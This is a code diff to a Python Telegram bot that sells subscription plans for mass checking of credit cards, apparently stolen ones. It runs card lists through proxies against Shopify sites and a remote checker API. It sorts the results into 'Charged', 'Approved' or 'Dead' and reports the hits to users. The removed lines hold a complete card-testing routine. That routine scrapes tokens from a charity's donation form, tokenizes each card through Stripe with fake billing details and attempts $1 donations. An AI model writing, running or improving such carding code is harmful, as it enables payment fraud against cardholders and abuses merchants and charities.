@@ -21,6 +21,11 @@ from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filt
 from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
 from telegram.constants import ParseMode
 
+from telethon.errors import FloodWaitError, UserNotParticipantError
+from telethon import TelegramClient, events, Button
+from telethon.tl.types import ChannelParticipantBanned
+from telethon.tl.functions.channels import GetParticipantRequest
+
 from database2 import (
     init_db, ensure_user, get_user_plan, set_user_plan,
     get_all_user_proxies, add_proxy_db, remove_proxy_by_index,
@@ -68,7 +73,7 @@ CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-WORKERS = 15  
+WORKERS = 50  
 API_TIMEOUT = 30  
 DELAY = 1.0  
 HIT_DELAY = 0.2
@@ -83,9 +88,8 @@ USER_LAST_REQ = {}
 ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
 
-# ====================== GLOBAL CHARGED FONT ENGINE & REVERSE TRANSLATOR ======================
+# ====================== GLOBAL CHARGED FONT ENGINE ======================
 def sf(text) -> str:
-    """Converts ALL English letters and Numbers to Mathematical Sans-Serif Bold (𝗖𝗛𝗔𝗥𝗚𝗘𝗗 style)"""
     if text is None: return ""
     res = ""
     for c in str(text):
@@ -96,7 +100,6 @@ def sf(text) -> str:
     return res
 
 def unsf(text) -> str:
-    """Reverts Mathematical Sans-Serif Bold back to standard ASCII for database checking"""
     if text is None: return ""
     res = ""
     for c in str(text):
@@ -111,14 +114,14 @@ def escape_html(text):
     if not text: return "Unknown"
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
-# ====================== USER REQUESTED PREMIUM ANIMATED EMOJIS ======================
+# ====================== PREMIUM EMOJIS ======================
 CE_STAR = '<tg-emoji emoji-id="6201647288947839133">⭐</tg-emoji>'
 CE_FIRE = '<tg-emoji emoji-id="5445189224682779974">🔥</tg-emoji>'
 CE_GEAR = '<tg-emoji emoji-id="5445358884480916784">⚙️</tg-emoji>'
 CE_ROCKET = '<tg-emoji emoji-id="5445163772706582819">🚀</tg-emoji>'
 CE_TIME = '<tg-emoji emoji-id="5447311106030726740">⏱</tg-emoji>'
 
-# ====================== 250+ COUNTRIES FLAGS ALGORITHM ======================
+# ====================== COUNTRIES FLAGS ======================
 ALL_COUNTRY_CODES = ["AD","AE","AF","AG","AI","AL","AM","AO","AQ","AR","AS","AT","AU","AW","AX","AZ","BA","BB","BD","BE","BF","BG","BH","BI","BJ","BL","BM","BN","BO","BQ","BR","BS","BT","BV","BW","BY","BZ","CA","CC","CD","CF","CG","CH","CI","CK","CL","CM","CN","CO","CR","CU","CV","CW","CX","CY","CZ","DE","DJ","DK","DM","DO","DZ","EC","EE","EG","EH","ER","ES","ET","FI","FJ","FK","FM","FO","FR","GA","GB","GD","GE","GF","GG","GH","GI","GL","GM","GN","GP","GQ","GR","GS","GT","GU","GW","GY","HK","HM","HN","HR","HT","HU","ID","IE","IL","IM","IN","IO","IQ","IR","IS","IT","JE","JM","JO","JP","KE","KG","KH","KI","KM","KN","KP","KR","KW","KY","KZ","LA","LB","LC","LI","LK","LR","LS","LT","LU","LV","LY","MA","MC","MD","ME","MF","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MR","MS","MT","MU","MV","MW","MX","MY","MZ","NA","NC","NE","NF","NG","NI","NL","NO","NP","NR","NU","NZ","OM","PA","PE","PF","PG","PH","PK","PL","PM","PN","PR","PS","PT","PW","PY","QA","RE","RO","RS","RU","RW","SA","SB","SC","SD","SE","SG","SH","SI","SJ","SK","SL","SM","SN","SO","SR","SS","ST","SV","SX","SY","SZ","TC","TD","TF","TG","TH","TJ","TK","TL","TM","TN","TO","TR","TT","TV","TW","TZ","UA","UG","UM","US","UY","UZ","VA","VC","VE","VG","VI","VN","VU","WF","WS","YE","YT","ZA","ZM","ZW"]
 COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}
 
@@ -127,7 +130,7 @@ def get_flag_emoji(country_code, fallback="🏳️"):
     c = country_code.upper()
     return COUNTRY_FLAGS.get(c, chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397) if c.isalpha() else fallback)
 
-# ====================== GIF ASSETS ======================
+# ====================== GIF ASSETS (EXPANDED) ======================
 WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"
 REDEEM_GIF = "https://media.giphy.com/media/l41YkxvU8c7J7Bba0/giphy.gif"
 ANIME_GIFS = [
@@ -138,7 +141,17 @@ ANIME_GIFS = [
     "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
     "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
     "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif",
-    "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif"
+    "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif",
+    "https://media.giphy.com/media/26tn33aiTi1jIGs14/giphy.gif",
+    "https://media.giphy.com/media/l0HlHFRbmaZtBRhXG/giphy.gif",
+    "https://media.giphy.com/media/3oKIPa2TdahYIGANYc/giphy.gif",
+    "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGZtbzF1Z2UwbTNqcjFqZ3B5ZXRkZG5uYXFzYnp3dTkxM2FpYnN0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LpwBqCorPvXI0zEDhI/giphy.gif",
+    "https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif",
+    "https://media.giphy.com/media/wW95fEq09hOI8/giphy.gif",
+    "https://media.giphy.com/media/13HgwGsXF0aiGY/giphy.gif",
+    "https://media.giphy.com/media/aBfS8WqcRGDgA/giphy.gif",
+    "https://media.giphy.com/media/7kn27lnYSAE9O/giphy.gif",
+    "https://media.giphy.com/media/5Zesu5VP1d2Ew/giphy.gif"
 ]
 
 PLANS = {
@@ -199,34 +212,49 @@ def get_cc_limit(plan, uid=0):
 def is_paid_plan(plan):
     return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
 
-# ====================== STRICT FORCED GIF ENGINE ======================
+# ====================== STRICT FORCED GIF ENGINE (CACHE + BYTES) ======================
+async def get_gif_media(specific_url=None):
+    url = specific_url or random.choice(ANIME_GIFS)
+    if url in _GIF_FILE_IDS:
+        return _GIF_FILE_IDS[url], url
+    try:
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, headers=headers, timeout=5) as resp:
+                if resp.status == 200:
+                    data = await resp.read()
+                    bio = io.BytesIO(data)
+                    bio.name = 'animation.gif'
+                    return bio, url
+    except Exception as e:
+        logger.error(f"Failed to download GIF bytes: {e}")
+    return url, url
+
 async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
     target = update.callback_query.message if update.callback_query else update.message
     if not target: return None
 
-    if use_gif or specific_gif:
-        url = specific_gif or random.choice(ANIME_GIFS)
-        media_to_send = _GIF_FILE_IDS.get(url, url)
-        
-        for _ in range(3):
-            try: 
-                msg = await target.reply_animation(
-                    animation=media_to_send, 
-                    caption=text, 
-                    reply_markup=markup, 
-                    parse_mode=ParseMode.HTML,
-                    read_timeout=30,
-                    write_timeout=30,
-                    connect_timeout=30
-                )
-                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                    _GIF_FILE_IDS[url] = msg.animation.file_id
-                return msg
-            except RetryAfter as e:
-                await asyncio.sleep(e.retry_after + 1)
-            except Exception:
-                await asyncio.sleep(1)
+    media_obj, url = await get_gif_media(specific_gif)
+    
+    for _ in range(3):
+        try: 
+            msg = await target.reply_animation(
+                animation=media_obj, 
+                caption=text, 
+                reply_markup=markup, 
+                parse_mode=ParseMode.HTML,
+                read_timeout=30, write_timeout=30, connect_timeout=30
+            )
+            # حفظ الـ file_id لسرعة الإرسال مستقبلاً
+            if url and isinstance(media_obj, io.BytesIO) and getattr(msg, 'animation', None):
+                _GIF_FILE_IDS[url] = msg.animation.file_id
+            return msg
+        except RetryAfter as e:
+            await asyncio.sleep(e.retry_after + 1)
+        except Exception:
+            media_obj, url = await get_gif_media()
+            await asyncio.sleep(1)
 
     try: 
         return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -236,37 +264,38 @@ async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, sp
 async def styled_edit(msg, text, buttons=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
     try:
-        if msg.animation or msg.photo or msg.video or msg.document: 
+        if getattr(msg, 'animation', None) or getattr(msg, 'photo', None) or getattr(msg, 'video', None) or getattr(msg, 'document', None): 
             return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
         return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except BadRequest as e:
+        if "Message is not modified" not in str(e):
+            logger.error(f"Edit msg error: {e}")
+        return msg
     except Exception: 
         return None
 
 async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
-    if use_gif or specific_gif:
-        url = specific_gif or random.choice(ANIME_GIFS)
-        media_to_send = _GIF_FILE_IDS.get(url, url)
-        
-        for _ in range(3):
-            try: 
-                msg = await bot.send_animation(
-                    chat_id=chat_id, 
-                    animation=media_to_send, 
-                    caption=text, 
-                    reply_markup=markup, 
-                    parse_mode=ParseMode.HTML,
-                    read_timeout=30,
-                    write_timeout=30,
-                    connect_timeout=30
-                )
-                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                    _GIF_FILE_IDS[url] = msg.animation.file_id
-                return msg
-            except RetryAfter as e:
-                await asyncio.sleep(e.retry_after + 1)
-            except Exception:
-                await asyncio.sleep(1)
+    media_obj, url = await get_gif_media(specific_gif)
+    
+    for _ in range(3):
+        try: 
+            msg = await bot.send_animation(
+                chat_id=chat_id, 
+                animation=media_obj, 
+                caption=text, 
+                reply_markup=markup, 
+                parse_mode=ParseMode.HTML,
+                read_timeout=30, write_timeout=30, connect_timeout=30
+            )
+            if url and isinstance(media_obj, io.BytesIO) and getattr(msg, 'animation', None):
+                _GIF_FILE_IDS[url] = msg.animation.file_id
+            return msg
+        except RetryAfter as e:
+            await asyncio.sleep(e.retry_after + 1)
+        except Exception:
+            media_obj, url = await get_gif_media()
+            await asyncio.sleep(1)
 
     try: 
         return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -315,22 +344,40 @@ def parse_proxy_format(proxy):
 
 _CACHED_SITES = []
 _LAST_SITES_FETCH = 0
+
+# 🔥 فلتر ذكي لتدمير البوابات والروابط التالفة وتنظيف الملف
 async def get_github_sites():
     global _CACHED_SITES, _LAST_SITES_FETCH
     now = time.time()
     if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
+    
+    domain_regex = re.compile(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
+    
     try:
         headers = {"User-Agent": "Mozilla/5.0"}
         async with aiohttp.ClientSession() as s:
             async with s.get(GITHUB_SITES_URL, headers=headers, timeout=10) as r:
                 if r.status == 200:
-                    _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
-                    _LAST_SITES_FETCH = now
+                    raw_text = await r.text()
+                    valid_sites = []
+                    for line in raw_text.split('\n'):
+                        clean = re.sub(r'^https?://', '', line.strip()).split('/')[0].strip()
+                        if domain_regex.match(clean): valid_sites.append(clean)
+                    if valid_sites:
+                        _CACHED_SITES = list(set(valid_sites))
+                        _LAST_SITES_FETCH = now
     except Exception: pass
+    
     if not _CACHED_SITES and os.path.exists('sites.txt'):
         try:
             async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
-                _CACHED_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
+                raw_text = await f.read()
+                valid_sites = []
+                for line in raw_text.split('\n'):
+                    clean = re.sub(r'^https?://', '', line.strip()).split('/')[0].strip()
+                    if domain_regex.match(clean): valid_sites.append(clean)
+                if valid_sites:
+                    _CACHED_SITES = list(set(valid_sites))
         except Exception: pass
     return _CACHED_SITES
 
@@ -407,7 +454,7 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_FIRE} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# ====================== STRICT CHECKER API (SHOPIFY + STRIPE 1$) ======================
+# ====================== STRICT CHECKER API ======================
 async def get_bin_info(bin_code):
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
@@ -417,141 +464,6 @@ async def get_bin_info(bin_code):
                     return {"brand": d.get("brand", "-"), "type": d.get("type", "-"), "level": d.get("level", "-"), "bank": d.get("bank", "-"), "country": d.get("country_name", "-"), "country_code": d.get("country", ""), "flag": d.get("country_flag", "")}
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
-
-async def check_stripe_donate_api(card, proxy, session):
-    """STRICT Stripe Donate 1$ Gateway - Zero False Positives"""
-    try:
-        parts = card.split('|')
-        if len(parts) < 4: return {'status': 'Dead', 'message': 'Invalid Card Format', 'card': card}
-        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-        yy_short = yy if len(yy) == 2 else yy[-2:]
-        email = f'Ahmed{random.randint(100,999)}@gmail.com'
-        
-        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
-        if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"
-
-        site_url = 'https://printsofhope.org/donations/donate-now/'
-        base_url = 'https://printsofhope.org'
-        ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
-        
-        # 1. Fetch Form Tokens
-        headers_get = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
-        async with session.get(site_url, headers=headers_get, proxy=proxy_str, timeout=30) as r1:
-            html = await r1.text()
-            
-        if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
-            fid_match = re.search(r'form-id[=]+(\d+)', html)
-            if fid_match:
-                iframe_url = f'{base_url}/?givewp-route=donation-form-view&form-id={fid_match.group(1)}'
-                async with session.get(iframe_url, headers=headers_get, proxy=proxy_str, timeout=30) as r2:
-                    html = await r2.text()
-
-        fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
-        fi = re.search(r'name="give-form-id" value="(.*?)"', html)
-        nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
-        pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
-        sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
-
-        if not all([fp, fi, nc, pk]):
-            return {'status': 'Site Error', 'message': "Token Extraction Failed", 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        fp_v, fi_v, nc_v, pk_v = fp.group(1), fi.group(1), nc.group(1), pk.group(1)
-        sa_v = sa.group(1) if sa else ''
-        sa_param = f'&_stripe_account={sa_v}' if sa_v else ''
-
-        # 2. Ajax Initialization
-        headers_ajax = {'origin': base_url, 'referer': site_url, 'user-agent': ua, 'x-requested-with': 'XMLHttpRequest'}
-        data_ajax = {
-            'give-honeypot': '', 'give-form-id-prefix': fp_v, 'give-form-id': fi_v,
-            'give-form-title': 'Give a Donation', 'give-current-url': site_url,
-            'give-form-url': site_url, 'give-form-minimum': '1.00',
-            'give-form-maximum': '999999.99', 'give-form-hash': nc_v,
-            'give-price-id': 'custom', 'give-amount': '1.00',
-            'give_stripe_payment_method': '', 'payment-mode': 'stripe',
-            'give_first': 'Ahmed', 'give_last': 'Ahmed', 'give_email': email,
-            'give_comment': '', 'card_name': 'Ahmed', 'billing_country': 'US',
-            'card_address': 'Ahmed sj', 'card_address_2': '', 'card_city': 'tomrr',
-            'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
-            'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
-        }
-        async with session.post(f'{base_url}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, proxy=proxy_str, timeout=30) as r3:
-            await r3.text()
-
-        # 3. Stripe Tokenization (Early Catch)
-        headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua}
-        stripe_data = f'type=card&billing_details[name]=Ahmed++Ahmed+&billing_details[email]={email}&billing_details[address][line1]=Ahmed+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={site_url}&time_on_page=85758&key={pk_v}{sa_param}'
-
-        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, proxy=proxy_str, timeout=30) as r4:
-            sr = await r4.json()
-
-        if 'error' in sr:
-            em = sr['error'].get('message', 'Unknown Error')
-            ec = sr['error'].get('code', '')
-            ed = sr['error'].get('decline_code', '')
-            err_msg = f"{em} ({ed})" if ed else em
-            
-            rl = err_msg.lower()
-            if 'insufficient' in rl or 'not enough' in rl or ed == 'insufficient_funds': 
-                return {'status': 'Insufficient', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or ec in ['incorrect_cvc', 'incorrect_zip'] or ed in ['incorrect_cvc', 'incorrect_zip']: 
-                return {'status': 'Approved', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'rate_limit' in rl or 'processing error' in rl or ec == 'rate_limit': 
-                return {'status': 'Site Error', 'message': err_msg, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            else: 
-                return {'status': 'Dead', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        pm_id = sr['id']
-
-        # 4. Strict Final Processing
-        headers_final = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'referer': site_url, 'upgrade-insecure-requests': '1', 'user-agent': ua}
-        params_final = {'payment-mode': 'stripe', 'form-id': fi_v}
-        data_final = data_ajax.copy()
-        data_final['give_stripe_payment_method'] = pm_id
-        data_final.pop('give_ajax', None)
-        
-        async with session.post(site_url, params=params_final, headers=headers_final, data=data_final, proxy=proxy_str, timeout=30, allow_redirects=True) as r5:
-            final_text = await r5.text()
-            current_url = str(r5.url).lower()
-
-        # Rule A: Explicit Errors
-        if 'give_error' in final_text.lower() or 'give_errors' in final_text.lower():
-            err_matches = re.findall(r'<li[^>]*>(.*?)</li>', final_text, re.IGNORECASE)
-            if not err_matches:
-                err_matches = re.findall(r'class="give_error[^>]*>(.*?)</div>', final_text, re.IGNORECASE)
-                
-            if err_matches:
-                clean_error = " | ".join([unescape(re.sub(r'<[^>]+>', '', em)).strip() for em in err_matches])
-            else:
-                clean_error = "Card Declined"
-                
-            rl = clean_error.lower()
-            if 'insufficient funds' in rl or 'not enough' in rl: 
-                return {'status': 'Insufficient', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or 'zip' in rl or 'cvc' in rl or 'approved' in rl: 
-                return {'status': 'Approved', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif any(k in rl for k in ['minimum donation', 'robot', 'captcha', 'security check', 'processing error']): 
-                return {'status': 'Site Error', 'message': clean_error, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            else: 
-                return {'status': 'Dead', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        # Rule B: Generic Dead Phrases
-        if 'declined' in final_text.lower() or 'payment failed' in final_text.lower():
-            return {'status': 'Dead', 'message': 'Payment Failed / Declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        # Rule C: Strict Charged Logic (Must have explicit receipt flag)
-        if 'donation-receipt' in final_text.lower() or 'donation-confirmation' in final_text.lower() or 'donation-confirmation' in current_url or 'receipt' in current_url:
-            return {'status': 'Charged', 'message': 'Donation Successful', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            
-        success_phrases = ['thank you for your donation', 'donation receipt', 'payment complete', 'payment succeeded']
-        for phrase in success_phrases:
-            if phrase.lower() in final_text.lower():
-                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        # Rule D: Ultimate Fallback (Safe Dead)
-        return {'status': 'Dead', 'message': 'Gateway Declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-    except Exception as e: return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:20]}', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
 async def check_card_api(card, site, proxy, session, gateway_name):
     try:
@@ -597,18 +509,13 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
     lr = None; ap = list(proxies) if proxies else []
     for _ in range(max_retries):
         p = random.choice(ap) if ap else None
-        
-        if gateway_name == "Stripe":
-            r = await check_stripe_donate_api(card, p, session)
-            s = "Stripe" 
-        else:
-            acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
-            if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
-            s = random.choice(acs)
-            r = await check_card_api(card, s, p, session, gateway_name)
+        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
+        if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
+        s = random.choice(acs)
+        r = await check_card_api(card, s, p, session, gateway_name)
             
         if not r.get('retry'):
-            if gateway_name != "Stripe" and r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+            if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
                 _SITE_ERRORS_COUNT[s] = 0
             return r
         lr = r; await asyncio.sleep(DELAY)
@@ -707,8 +614,10 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         PENDING_FILES[uid] = cards
         
         kb = [
-            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success"), InlineKeyboardButton(sf("Stripe (1$)"), callback_data="gate:Stripe", style="success")],
-            [InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary"), InlineKeyboardButton(sf("PayPal (Soon)"), callback_data="gate:soon_PayPal", style="primary")],
+            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success"), 
+             InlineKeyboardButton(sf("Stripe (Soon)"), callback_data="gate:soon_Stripe", style="primary")],
+            [InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary"), 
+             InlineKeyboardButton(sf("PayPal (Soon)"), callback_data="gate:soon_PayPal", style="primary")],
             [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
         ]
         await styled_edit(pm, f"<b>{CE_STAR} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_GEAR} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_ROCKET} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
@@ -972,7 +881,7 @@ async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cp = await get_user_plan(uid)
     t = f"<b>{CE_STAR} {sf('VIP Subscription Plans')}</b>\n\n"
     for _, pi in PLANS.items():
-        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n│ ╰ <b>{CE_STAR} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
+        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_TIME} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_STAR} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
     t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
     kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
     await styled_edit(q.message, t, buttons=kb)
@@ -1055,7 +964,7 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
         PENDING_FILES.pop(uid, None)
         return await styled_edit(msg_obj, f"<b>{CE_FIRE} {sf('Process Cancelled.')}</b>", buttons=None)
     cards = PENDING_FILES.pop(uid, None)
-    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
+    if not cards: return await q.answer("⚠️ Session expired or invalid file.", show_alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
     await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>\n╰ <b>{CE_ROCKET} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
@@ -1111,22 +1020,14 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             except Exception: break
             try:
                 c_st = time.time()
-                
-                if gate_name == "Stripe":
-                    p = random.choice(proxies) if proxies else None
-                    res = await check_stripe_donate_api(card, p, http_session)
-                else:
-                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
-                
+                res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                 if is_stopped(): break 
-                
                 c_el = time.time() - c_st
                 status = res.get('status', 'Dead')
                 chk += 1
                 
                 raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                 short_msg = (raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg
-                
                 last_resp = sf(short_msg)
                 
                 if status == 'Charged':
@@ -1182,13 +1083,24 @@ async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed, bo
 async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     puid = int(q.data.split(":")[1])
-    if q.from_user.id != puid and q.from_user.id not in ADMIN_ID: return await q.answer("⚠️ Not yours!", show_alert=True)
+    if q.from_user.id != puid and q.from_user.id not in ADMIN_ID: 
+        return await q.answer("⚠️ Not yours!", show_alert=True)
+        
     proc = ACTIVE_MTXT_PROCESSES.get(puid)
     if proc:
         proc["stopped"] = True
         for t in proc.get("tasks", []):
             if not t.done(): t.cancel()
+            
+    # هذا الرد المنبثق السريع (لا يدعم إيموجي متحرك)
     await q.answer("🛑 Stopped Immediately!", show_alert=True)
+    
+    # 🟢 هنا استخدمنا الإيموجي المتحرك الخاص بك (📬) في رسالة فعلية
+    stop_msg = f"<b>{CE_MAIL} {sf('The process has been stopped successfully.')}</b>"
+    
+    # إرسال الرسالة مع الإيموجي المتحرك
+    await context.bot.send_message(chat_id=q.message.chat_id, text=stop_msg, parse_mode="HTML")
+
 
 async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()
 
@@ -1218,7 +1130,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH STRICT STRIPE 1$ & CHARGED FONT!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH STRICT SHOPIFY (STRIPE DISABLED) & FORCED GIFS!")
     
     while True:
         try:
